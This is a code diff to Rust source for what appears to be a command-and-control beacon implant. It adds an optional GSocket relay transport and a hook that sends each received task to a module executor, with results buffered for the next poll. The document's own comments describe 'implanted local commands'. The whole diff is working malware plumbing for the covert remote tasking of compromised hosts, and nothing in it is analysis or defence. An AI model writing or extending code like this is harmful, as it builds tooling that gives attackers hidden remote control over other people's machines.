@@ -4,6 +4,7 @@ use std::sync::{Arc, Mutex, RwLock};
 use std::time::Duration;
 
 use nw_profile::{
+    config::GSocketConfig,
     crypto,
     envelope::{Envelope, Kind},
     msgs::{PollReply, PollRequest, Register, RegisterAck, Task, TaskResult},
@@ -65,8 +66,16 @@ pub struct BeaconRuntime {
 
 impl BeaconRuntime {
     pub fn new(profile: Profile, psk: Vec<u8>) -> Self {
+        Self::new_with_gsocket(profile, psk, None)
+    }
+
+    pub fn new_with_gsocket(
+        profile: Profile,
+        psk: Vec<u8>,
+        gsocket: Option<GSocketConfig>,
+    ) -> Self {
         let key = crypto::derive_key(&psk, b"nw-m1-salt");
-        let transport = Transport::from_endpoint(&profile.endpoint).unwrap_or_else(|e| {
+        let transport = Transport::from_profile(&profile.endpoint, gsocket).unwrap_or_else(|e| {
             tracing::warn!("bad endpoint {:?}: {e}", profile.endpoint);
             Transport::Http {
                 client: Default::default(),
@@ -282,6 +291,10 @@ impl BeaconRuntime {
     /// Run one returned task, buffering its result for the next poll. Also
     /// handles the implanted local commands (`nw/*`).
     async fn run_one(&self, task: &Task) {
+        if let Some(result) = crate::modules::execute(task).await {
+            self.pending.lock().unwrap().push(result);
+            return;
+        }
         if task.command == "nw/exit" {
             self.trigger_stop();
             return;
